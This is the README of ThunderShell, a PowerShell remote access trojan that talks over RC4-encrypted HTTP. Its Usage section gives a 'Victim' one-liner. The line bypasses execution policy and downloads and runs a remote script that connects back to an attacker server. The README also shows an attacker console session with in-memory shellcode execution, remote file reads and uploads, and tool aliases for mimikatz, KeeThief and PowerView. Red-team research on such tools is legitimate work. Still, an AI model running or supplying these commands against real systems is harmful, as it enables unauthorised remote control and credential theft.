# ThunderShell

ThunderShell is a Powershell based RAT that rely on HTTP request to communicate. All the network traffic is encrypted using a second layer of RC4 to avoid SSL interception and defeat network hooks.

# Dependencies

```
apt install redis-server
apt install python-redis
```

# Usage

Victim:
```
powershell -exec bypass IEX (New-Object Net.WebClient).DownloadString("http://ringzer0team.com/PS-RemoteShell.ps1); PS-RemoteShell -ip 1.1.1.1 -port 8080 -Key test -Delay 2000
```

Attacker side example:
```
me@debian-dev:~$ python ThunderShell.py default.json

Thunder Shell 1.1 | Clients Server CLI
Mr.Un1k0d3r RingZer0 Team 2017
--------------------------------------------------------

[+] Starting web server on 192.168.17.129 port 8080

(Main)>>>
[+] Registering new shell 10.0.0.153:RingZer0\MrUn1k0d3r
[+] New shell ID 13 GUID is 4c05a17f-036a-4cd4-9446-da46281d5754


[-]  is not a valid command

(Main)>>> help

Help Menu
-----------------------

        list      args (full)             List all active shells
        interact  args (id)               Interact with a session
        event     args (log/http, count)  Show http or error log (default number of rows 10)
        kill      args (id)               Kill shell (clear db only)
        exit                              Exit the application
        help                              Show this help menu

(Main)>>> list

List of active shells
-----------------------

  11    10.0.0.153:RingZer0\MrUn1k0d3r
  13    10.0.0.153:RingZer0\MrUn1k0d3r
  5     10.0.0.153:RingZer0\MrUn1k0d3r
  2     10.0.0.153:RingZer0\MrUn1k0d3r
  3     10.0.0.153:RingZer0\MrUn1k0d3r

(Main)>>> interact 13

(10.0.0.153:RingZer0\MrUn1k0d3r)>>> help

Shell Help Menu
-----------------------

        background                              Return to the main console
        refresh                                 Check for previous commands output
        fetch         args (path/url, command)  In memory execution of a script and execute a commmand
        exec          args (path/url)           In memory execution of code (shellcode)
        read          args (remote path)        Read a file on the remote host
        upload        args (path/url, path)     Upload a file on the remote system
        delay         args (milliseconds)       Update the callback delay
        help                                    Show this help menu


List of path alias
-----------------------

        powerup                 PowerUp tool set
        wmiexec                 Remote-WmiExecute utility
        searchevent             Search-EventForUser utility
        keethief                KeeThief tool set (Get-KeePassDatabaseKey)
        mimikatz                Invoke-Mimikatz utility
        inveigh                 Invoke-Inveigh utility
        powerview               PowerView tool set)

(10.0.0.153:RingZer0\MrUn1k0d3r)>>> whoami
RingZer0\MrUn1k0d3r



(10.0.0.153:RingZer0\MrUn1k0d3r)>>> delay 0
Updating delay to 0
Delay is now 0


(10.0.0.153:RingZer0\MrUn1k0d3r)>>> fetch powerview Get-NetLocalGroup -ComputerName 127.0.0.1
[+] Fetching https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
[+] Executing Get-NetLocalGroup -ComputerName 127.0.0.1


(10.0.0.153:RingZer0\MrUn1k0d3r)>>> refresh


ComputerName : 127.0.0.1
AccountName  : 10-R90G3RLC-1GG/Administrator
IsDomain     : False
IsGroup      : False
SID          : S-1-5-21-630091541-2956043977-842813908-500
Description  : Built-in account for administering the computer/domain
PwdLastSet   : 8/11/2017 6:01:45 PM
PwdExpired   : False
UserFlags    : 66049
Disabled     : False
LastLogin    : 8/11/2017 5:58:47 PM
```

# Credit 
Mr.Un1k0d3r RingZer0 Team 2017
